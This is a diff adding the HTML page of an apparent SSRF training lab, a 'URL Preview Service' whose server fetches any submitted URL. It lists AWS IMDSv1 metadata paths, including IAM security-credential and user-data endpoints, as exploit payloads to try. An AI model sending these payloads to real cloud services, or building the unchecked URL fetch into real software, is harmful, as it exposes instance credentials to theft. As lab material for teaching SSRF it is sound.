@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>URL Preview Service</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 760px; margin: 3rem auto; padding: 0 1rem; color: #222; }
+    h1 { font-size: 1.4rem; }
+    .note { background: #fff3cd; border: 1px solid #ffe69c; padding: .75rem 1rem; border-radius: 8px; font-size: .9rem; }
+    input[type=text] { width: 100%; padding: .6rem; font-size: 1rem; box-sizing: border-box; }
+    button { margin-top: .6rem; padding: .55rem 1.1rem; font-size: 1rem; cursor: pointer; }
+    pre { background: #0d1117; color: #c9d1d9; padding: 1rem; border-radius: 8px; overflow: auto; white-space: pre-wrap; word-break: break-word; }
+    .examples code { display: block; background: #f3f4f6; padding: .35rem .6rem; border-radius: 6px; margin: .3rem 0; font-size: .85rem; }
+  </style>
+</head>
+<body>
+  <h1>🔎 URL Preview Service</h1>
+  <p class="note"><strong>Lab app — intentionally vulnerable to SSRF.</strong> Authorized testing only. The server fetches whatever URL you give it.</p>
+
+  <p>Enter a URL and the server will fetch it for you and show a preview.</p>
+  <input id="url" type="text" placeholder="https://example.com" value="http://169.254.169.254/latest/meta-data/">
+  <button onclick="go()">Preview</button>
+
+  <h3>Result</h3>
+  <pre id="out">(nothing yet)</pre>
+
+  <div class="examples">
+    <h3>IMDSv1 exploit paths to try</h3>
+    <code>http://169.254.169.254/latest/meta-data/</code>
+    <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
+    <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code>
+    <code>http://169.254.169.254/latest/user-data</code>
+  </div>
+
+  <script>
+    async function go() {
+      const url = document.getElementById('url').value;
+      const out = document.getElementById('out');
+      out.textContent = 'Fetching…';
+      try {
+        const r = await fetch('/fetch?url=' + encodeURIComponent(url));
+        out.textContent = 'HTTP ' + r.status + '\n\n' + (await r.text());
+      } catch (e) {
+        out.textContent = 'Error: ' + e;
+      }
+    }
+  </script>
+</body>
+</html>
